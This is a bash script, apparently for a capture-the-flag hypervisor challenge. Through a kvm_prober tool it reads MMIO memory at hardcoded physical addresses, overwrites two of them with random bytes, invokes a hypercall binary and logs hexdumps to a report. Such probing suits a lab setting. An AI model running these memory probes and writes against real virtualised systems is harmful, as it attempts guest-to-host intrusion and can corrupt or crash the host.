#!/bin/bash

set -euo pipefail

# ---- CONFIG ----
# These are your calculated physical addresses
READ_ADDR1=0x26279a8
READ_ADDR2=0x2b5ee10
WRITE_ADDR1=0x64279a8
WRITE_ADDR2=0x695ee10
SIZE=256     # adjust as needed for flag size/context

REPORT="mmio_test_report_$(date +'%Y%m%d_%H%M%S').txt"

# ---- UTILS ----

dump_mem() {
    local addr=$1
    local size=$2
    echo "[*] Reading $size bytes at $addr"
    kvm_prober readmmio_buf "$addr" "$size" | tee >(hexdump -C) 
}

write_mem() {
    local addr=$1
    local pattern=$2
    local size=$3
    echo "[*] Writing pattern $pattern ($size bytes) to $addr"
    # create tmpfile with pattern, could be improved to match exploit need
    dd if=<(head -c "$size" < /dev/urandom) of=/tmp/wbuf bs=1 count="$size" 2>/dev/null
    kvm_prober writemmio_buf "$addr" /tmp/wbuf
}

call_hypercall() {
    echo "[*] Calling hypercall..."
    ./hypercall
}

log() {
    echo -e "$*" | tee -a "$REPORT"
}

# ---- MAIN TEST LOGIC ----

log "# MMIO Probe Report ($(date))"
log ""
log "Read Addresses:  $READ_ADDR1  $READ_ADDR2"
log "Write Addresses: $WRITE_ADDR1 $WRITE_ADDR2"
log "Data Size: $SIZE bytes"
log "----"

for addr in $READ_ADDR1 $READ_ADDR2; do
    log ""
    log "## Reading $addr before hypercall"
    mem_before=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
    log "[BEFORE] $addr:"
    log "$mem_before"
    log "[*] Calling hypercall after read of $addr"
    hypercall_resp=$(./hypercall 2>&1)
    log "[HYPERCALL RESPONSE] after read $addr:"
    log "$hypercall_resp"
done

for addr in $WRITE_ADDR1 $WRITE_ADDR2; do
    log ""
    log "## Reading $addr before write"
    mem_before=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
    log "[BEFORE] $addr:"
    log "$mem_before"

    # For the write, let's use a fixed or random pattern; update as needed
    log "[*] Writing random data to $addr"
    dd if=<(head -c "$SIZE" < /dev/urandom) of=/tmp/wbuf bs=1 count="$SIZE" 2>/dev/null
    kvm_prober writemmio_buf "$addr" /tmp/wbuf
    log "[*] Wrote random data to $addr"

    mem_after=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
    log "[AFTER] $addr:"
    log "$mem_after"

    log "[*] Calling hypercall after write of $addr"
    hypercall_resp=$(./hypercall 2>&1)
    log "[HYPERCALL RESPONSE] after write $addr:"
    log "$hypercall_resp"
done

log ""
log "# All tests done!"
echo "Report saved as $REPORT"
